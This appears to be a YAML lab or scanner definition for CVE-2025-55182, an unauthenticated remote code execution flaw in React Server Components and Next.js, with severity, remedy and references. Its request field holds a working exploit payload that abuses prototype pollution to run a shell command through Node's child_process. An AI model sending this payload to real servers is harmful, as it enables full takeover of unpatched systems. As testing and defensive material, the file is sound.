id: vt-2025-55182

info:
  name: "React Server Components - Remote Code Execution"
  author: omarkurt
  description: |
    React Server Components 19.0.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,
    react-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused
    by unsafe deserialization of payloads from HTTP requests to Server Function endpoints.
  targets:
    - "react-server-components"
    - "nextjs"
  type: CVE
  affected_versions:
    - "React 19.0.0, 19.1.1, 19.2.0"
    - "Next.js < 15.0.4"
  fixed_version: "React 19.2.1, Next.js 15.0.4"
  cve: "CVE-2025-55182"
  cwe: "CWE-502"
  cvss:
    score: "10.0"
    metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  tags:
    - rce
    - deserialization
    - react
    - nextjs

vulnerabilities:
  endpoint: /
  method: POST
  param: multipart/form-data
  request: |
    POST / HTTP/1.1
    Next-Action: x
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

    ------WebKitFormBoundary
    Content-Disposition: form-data; name="0"

    {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
    ...

technical: |
  Pre-authentication Remote Code Execution in React Server Components (RSC).
  Exploits unsafe deserialization in Server Action response processing.
  An attacker can pollute the object prototype and trigger arbitrary Node.js code
  execution via the `_prefix` property in the RSC stream.

impact: |
  Total system compromise. An unauthenticated attacker can execute arbitrary
  system commands on the server with the privileges of the application process.

remedy: |
  Upgrade React to version 19.2.1 or higher.
  Upgrade Next.js to version 15.0.4 or higher.

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
  - https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
  - https://github.com/assetnote/react2shell-scanner
  - https://github.com/l4rm4nd/CVE-2025-55182

poc:
  nuclei:
    - "vt-2025-55182.nuclei.yaml"

remediation:
  - "Update to React 19.2.1 or newer"
  - "Update to Next.js 15.0.4 or newer"

providers:
  docker-compose:
    path: "docker-compose.yaml"
